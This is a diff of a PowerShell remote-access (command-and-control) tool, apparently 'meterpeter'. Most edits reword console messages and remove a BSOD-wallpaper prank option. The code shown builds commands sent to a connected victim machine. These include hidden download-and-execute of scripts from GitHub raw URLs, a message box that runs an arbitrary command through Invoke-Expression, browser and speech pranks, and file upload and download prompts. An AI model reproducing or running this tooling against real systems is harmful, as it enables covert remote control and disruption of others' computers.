@@ -958,37 +958,21 @@ While($Client.Connected)
       {
          $MaxInteractions = Read-Host " - How many times to loop prank?  (8) "
          [int]$DelayTime = Read-Host " - The delay time between loops?  (6) "
-         $bsodwallpaper = Read-Host " - Modify the wallpaper to BSOD? (y|n)"
-         If($bsodwallpaper -iMatch '^(n|no)$' -or $bsodwallpaper -eq $null)
-         {
-            $bsodwallpaper = "false"
-         }
-         Else
-         {
-            $bsodwallpaper = "true"            
-         }
 
          If([int]$DelayTime -gt 30){[int]$DelayTime = '8'}
          If([int]$MaxInteractions -gt 30){$MaxInteractions = "20"}
          If([string]::IsNullOrEmpty($DelayTime)){[int]$DelayTime = '8'}
          If([string]::IsNullOrEmpty($MaxInteractions)){$MaxInteractions = "20"}
 
-         Write-Host " * Faking a critical system error (bsod)" -ForegroundColor Green
-         Write-Host "   => takes aprox 30 seconds to run`n`n" -ForegroundColor DarkYellow
+         Write-Host " * Faking a critical system error (BSOD)" -ForegroundColor Green
+         Write-Host "   => Takes aprox 30 seconds to run`n`n" -ForegroundColor DarkYellow
 
-         write-host "   Executing BSOD prank in background." -ForegroundColor Green
-         write-host "   MaxInteractions:[" -ForegroundColor DarkGray -NoNewline
+         write-host "   > Executing BSOD prank in background." -ForegroundColor Green
+         write-host "   > MaxInteractions:" -NoNewline
          write-host "$MaxInteractions" -ForegroundColor Red -NoNewline
-         write-host "] DelayTime:[" -ForegroundColor DarkGray -NoNewline
+         write-host " DelayTime:" -NoNewline
          write-host "$DelayTime" -ForegroundColor Red -NoNewline
-         write-host "](sec)`n" -ForegroundColor DarkGray;
-
-         If($bsodwallpaper -ieq "true")
-         {
-            write-host "   Wallpaper Path : `$Env:TMP\bsod.png" -ForegroundColor DarkGray;
-            write-host "   Registry Hive  : HKCU\Control Panel\Desktop\Wallpaper" -ForegroundColor DarkGray;
-            write-host "   RevertWallpaper: `$Env:TMP\RevertWallpaper.ps1`n`n" -ForegroundColor DarkYellow        
-         }
+         write-host " (sec)`n"
 
          #Execute remote command
          $Command = "powershell cd `$Env:TMP;iwr -Uri 'https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/C2Prank.ps1' -OutFile 'C2Prank.ps1'|Unblock-File;Start-Process -windowstyle hidden powershell -ArgumentList '-file C2Prank.ps1 -MaxInteractions $MaxInteractions -DelayTime $DelayTime'"
@@ -1031,7 +1015,7 @@ While($Client.Connected)
                Write-Host "   => Error: wrong input, set demo to '$MsgBoxText'" -ForegroundColor Red
             }
 
-            Write-Host "`n`n   Executing simple messagebox remote ..`n"
+            Write-Host "`n`n   > Executing simple messagebox remote ..`n"
             $Command = "powershell (New-Object -ComObject Wscript.Shell).Popup(`"$MsgBoxText`",$MsgBoxClose,`"$MsgBoxTitle`",4+64)|Out-Null"
          }
          If($msgbox_choise -ieq "cmdline")
@@ -1065,7 +1049,7 @@ While($Client.Connected)
             }
 
             Write-Host " * Spawn msgbox that exec cmdline" -ForegroundColor Green
-            $Command = "[int]`$MymsgBox = powershell (New-Object -ComObject Wscript.Shell).Popup(`"$MsgBoxText`",$MsgBoxClose,`"$MsgBoxTitle`",4+64);If(`$MymsgBox -eq 6){echo `"$MsgBoxAppli`"|Invoke-Expression;echo `"`n   Command '$MsgBoxAppli' executed.`"|Out-File msglogfile.log}Else{echo `"`n   Failed to execute '$MsgBoxAppli' command.`"|Out-File msglogfile.log};Get-Content -Path msglogfile.log;Remove-Item -Path msglogfile.log -Force"
+            $Command = "[int]`$MymsgBox = powershell (New-Object -ComObject Wscript.Shell).Popup(`"$MsgBoxText`",$MsgBoxClose,`"$MsgBoxTitle`",4+64);If(`$MymsgBox -eq 6){echo `"$MsgBoxAppli`"|Invoke-Expression;echo `"`n   `> Command '$MsgBoxAppli' executed.`"|Out-File msglogfile.log}Else{echo `"`n   `> Fail to execute '$MsgBoxAppli' command.`"|Out-File msglogfile.log};Get-Content -Path msglogfile.log;Remove-Item -Path msglogfile.log -Force"
          }
          If($msgbox_choise -ieq "Return" -or $msgbox_choise -ieq "cls" -or $msgbox_choise -ieq "modules" -or $msgbox_choise -ieq "clear")
          {
@@ -1092,13 +1076,13 @@ While($Client.Connected)
            If(-not ($MYSpeak -ieq $False -or $MYSpeak -eq ""))
            {
              write-host ""
-             $Command = "`$My_Line = `"$MYSpeak`";Add-Type -AssemblyName System.speech;`$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer;`$speak.Volume = 85;`$speak.Rate = -2;`$speak.Speak(`$My_Line);echo `"   Speak Frase: '$MYSpeak' ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
+             $Command = "`$My_Line = `"$MYSpeak`";Add-Type -AssemblyName System.speech;`$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer;`$speak.Volume = 85;`$speak.Rate = -2;`$speak.Speak(`$My_Line);echo `"   `> Speak Frase: '$MYSpeak' ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
            }
            Else
            {
              write-host "";
              $MYSpeak = "Next time dont forget to input the text ok?";
-             $Command = "`$My_Line = `"$MYSpeak`";Add-Type -AssemblyName System.speech;`$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer;`$speak.Volume = 85;`$speak.Rate = -2;`$speak.Speak(`$My_Line);echo `"   Speak Frase: '$MYSpeak' ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
+             $Command = "`$My_Line = `"$MYSpeak`";Add-Type -AssemblyName System.speech;`$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer;`$speak.Volume = 85;`$speak.Rate = -2;`$speak.Speak(`$My_Line);echo `"   `> Speak Frase: '$MYSpeak' ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
            }
         }
         If($Speak_choise -ieq "Return" -or $Speak_choise -ieq "cls" -or $Speak_choise -ieq "Modules" -or $Speak_choise -ieq "clear")
@@ -1129,7 +1113,7 @@ While($Client.Connected)
             }
             
             write-host ""
-            $Command = "Start-Process -WindowStyle Maximized `"$UrlLink`"|Out-Null;If(`$? -eq `"True`"){echo `"   Successfuly open URL: $UrlLink`"|Out-File defbrowser.meterpeter;Start-Sleep -Seconds 1;Get-Content -Path defbrowser.meterpeter;Remove-Item -Path defbrowser.meterpeter -Force}Else{echo `"   Fail to open URL: $UrlLink`"|Out-File defbrowser.meterpeter;Get-Content -Path defbrowser.meterpeter;Remove-Item -Path defbrowser.meterpeter -Force}" 
+            $Command = "Start-Process -WindowStyle Maximized `"$UrlLink`"|Out-Null;If(`$? -eq `"True`"){echo `"   `> Successfuly open URL: $UrlLink`"|Out-File defbrowser.meterpeter;Start-Sleep -Seconds 1;Get-Content -Path defbrowser.meterpeter;Remove-Item -Path defbrowser.meterpeter -Force}Else{echo `"   `> Fail to open URL: $UrlLink`"|Out-File defbrowser.meterpeter;Get-Content -Path defbrowser.meterpeter;Remove-Item -Path defbrowser.meterpeter -Force}" 
             $UrlLink = $null
          }
          If($url_choise -ieq "Return" -or $url_choise -ieq "cls" -or $url_choise -ieq "modules" -or $url_choise -ieq "clear")
@@ -1166,43 +1150,43 @@ While($Client.Connected)
         {
            write-host "`n";
            $cmdline = "https://elgoog.im/terminal"
-           $Command = "cmd /R start /max $cmdline;echo `"   [i] Opened: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
+           $Command = "cmd /R start /max $cmdline;echo `"   `> Open: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
         }
         If($EasterEgg -ieq "trexgame")
         {
            write-host "`n";
            $cmdline = "https://elgoog.im/t-rex"
-           $Command = "cmd /R start /max $cmdline;echo `"   [i] Opened: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
+           $Command = "cmd /R start /max $cmdline;echo `"   `> Open: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
         }
         If($EasterEgg -ieq "kidscoding")
         {
            write-host "`n";
            $cmdline = "https://www.google.com/logos/2017/logo17/logo17.html"
-           $Command = "cmd /R start /max $cmdline;echo `"   [i] Opened: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
+           $Command = "cmd /R start /max $cmdline;echo `"   `> Open: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
         }
         If($EasterEgg -ieq "googlespace")
         {
            write-host "`n";
            $cmdline = "https://mrdoob.com/projects/chromeexperiments/google-space/"
-           $Command = "cmd /R start /max $cmdline;echo `"   [i] Opened: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
+           $Command = "cmd /R start /max $cmdline;echo `"   `> Open: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
         }
         If($EasterEgg -ieq "teapot")
         {
            write-host "`n";
            $cmdline = "https://www.google.com/teapot"
-           $Command = "cmd /R start /max $cmdline;echo `"   [i] Opened: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
+           $Command = "cmd /R start /max $cmdline;echo `"   `> Open: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
         }
         If($EasterEgg -ieq "sphere")
         {
            write-host "`n";
            $cmdline = "https://mrdoob.com/projects/chromeexperiments/google-sphere"
-           $Command = "cmd /R start /max $cmdline;echo `"   [i] Opened: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
+           $Command = "cmd /R start /max $cmdline;echo `"   `> Open: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
         }
         If($EasterEgg -ieq "gravity")
         {
            write-host "`n";
            $cmdline = "https://mrdoob.com/projects/chromeexperiments/google-gravity"
-           $Command = "cmd /R start /max $cmdline;echo `"   [i] Opened: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
+           $Command = "cmd /R start /max $cmdline;echo `"   `> Open: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
         }
         If($EasterEgg -ieq "rotate")
         {
@@ -1230,37 +1214,37 @@ While($Client.Connected)
 
            write-host "`n";
            $cmdline = "https://www.google.com/search?q=do+a+barrel+roll"
-           $Command = "cd `$Env:TMP;iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Misc-CmdLets/Prank2.ps1`" -OutFile `"`$Env:TMP\Prank2.ps1`"|Unblock-File;Start-Process -WindowStyle Hidden powershell -ArgumentList `"powershell -File `$Env:TMP\Prank2.ps1 -StartDelay '3' -LoopRange $LoopRange -LoopDelay $LoopDelay`";echo `"   [i] Opened: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
+           $Command = "cd `$Env:TMP;iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Misc-CmdLets/Prank2.ps1`" -OutFile `"`$Env:TMP\Prank2.ps1`"|Unblock-File;Start-Process -WindowStyle Hidden powershell -ArgumentList `"powershell -File `$Env:TMP\Prank2.ps1 -StartDelay '3' -LoopRange $LoopRange -LoopDelay $LoopDelay`";echo `"   `> Open: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
         }
         If($EasterEgg -ieq "rush")
         {
            write-host "`n";
            $cmdline = "https://elgoog.im/zergrush/"
-           $Command = "cmd /R start /max $cmdline;echo `"   [i] Opened: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
+           $Command = "cmd /R start /max $cmdline;echo `"   `> Open: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
         }
         If($EasterEgg -ieq "moon")
         {
            write-host "`n";
            $cmdline = "https://www.google.com/moon/"
-           $Command = "cmd /R start /max $cmdline;echo `"   [i] Opened: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
+           $Command = "cmd /R start /max $cmdline;echo `"   `> Open: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
         }
         If($EasterEgg -ieq "mirror")
         {
            write-host "`n";
            $cmdline = "https://elgoog.im/google-mirror/"
-           $Command = "cmd /R start /max $cmdline;echo `"   [i] Opened: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
+           $Command = "cmd /R start /max $cmdline;echo `"   `> Open: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
         }
         If($EasterEgg -ieq "pacman")
         {
            write-host "`n";
            $cmdline = "https://elgoog.im/pacman/"
-           $Command = "cmd /R start /max $cmdline;echo `"   [i] Opened: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
+           $Command = "cmd /R start /max $cmdline;echo `"   `> Open: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
         }
         If($EasterEgg -ieq "invaders")
         {
            write-host "`n";
            $cmdline = "https://elgoog.im/space-invaders/"
-           $Command = "cmd /R start /max $cmdline;echo `"   [i] Opened: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
+           $Command = "cmd /R start /max $cmdline;echo `"   `> Open: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
         }        
         If($EasterEgg -ieq "Return" -or $EasterEgg -ieq "cls" -or $EasterEgg -ieq "Modules" -or $EasterEgg -ieq "clear")
         {
@@ -3817,7 +3801,7 @@ While($Client.Connected)
         $Download_choise = Read-Host;
         If($Download_choise -ieq "Start")
         {
-           Write-Host " - Download Remote File: " -ForeGroundColor Red -NoNewline;
+           Write-Host " - Remote File Path: " -ForeGroundColor Red -NoNewline;
            $File = Read-Host;
 
            If(!("$File" -like "* *") -and !([string]::IsNullOrEmpty($File)))
@@ -3856,7 +3840,7 @@ While($Client.Connected)
         $Upload_choise = Read-Host;
         If($Upload_choise -ieq "Start")
         {
-           Write-Host " - Upload Local File: " -ForeGroundColor Red -NoNewline;
+           Write-Host " - Local File Path: " -ForeGroundColor Red -NoNewline;
            $File = Read-Host;
 
            If(!("$File" -like "* *") -and !([string]::IsNullOrEmpty($File)))
